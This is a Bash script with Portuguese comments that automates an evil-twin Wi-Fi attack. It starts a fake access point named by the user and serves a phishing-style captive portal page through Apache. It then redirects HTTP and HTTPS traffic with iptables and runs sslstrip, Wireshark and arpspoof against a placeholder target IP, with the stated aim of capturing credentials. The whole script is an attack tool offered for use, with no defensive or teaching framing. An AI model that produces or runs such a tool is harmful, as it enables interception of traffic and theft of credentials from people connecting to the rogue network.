#!/bin/bash

# Captura do nome da rede
read -p "Insira o nome da rede: " network_name

# Captura do caminho do arquivo html para o captive portal
read -p "Insira o caminho do arquivo HTML para o captive portal: " captive_portal_path

# Inicializa o fake AP
echo "Inicializando o Fake AP..."
sudo airmon-ng start wlan0
sudo airbase-ng -e "$network_name" -c 6 wlan0mon &

# Inicializa o Wireshark para captura dos pacotes
echo "Inicializando o Wireshark para captura dos pacotes..."
sudo wireshark &

# Inicializa o servidor Apache para servir a página do captive portal
echo "Inicializando o servidor Apache para o captive portal..."
sudo systemctl start apache2
sudo cp "$captive_portal_path" /var/www/html/index.html

# Redireciona o tráfego para o proxy
echo "Redirecionando o tráfego para o proxy..."
sudo iptables -t nat -A PREROUTING -i wlan0mon -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0mon -p tcp --dport 443 -j REDIRECT --to-port 8080

# Inicializa o sslstrip
echo "Inicializando o sslstrip para capturar o tráfego HTTPS..."
sudo sslstrip -w sslstrip.log &

# Inicializa o arpspoof para capturar as credenciais
echo "Inicializando o arpspoof para capturar as credenciais..."
sudo arpspoof -i wlan0mon -t <alvo IP> <gateway IP> &

# Espera pelo sinal de interrupção do usuário
echo "Pressione CTRL+C para encerrar o ataque."
trap "cleanup" INT

# Função para limpar e finalizar o ataque
cleanup() {
  echo "Encerrando o ataque..."
  sudo pkill airbase-ng
  sudo pkill wireshark
  sudo systemctl stop apache2
  sudo iptables -t nat -D PREROUTING -i wlan0mon -p tcp --dport 80 -j REDIRECT --to-port 8080
  sudo iptables -t nat -D PREROUTING -i wlan0mon -p tcp --dport 443 -j REDIRECT --to-port 8080
  sudo pkill sslstrip
  sudo pkill arpspoof
  exit
}

# Loop infinito para manter o script em execução
while true; do
  sleep 1
done
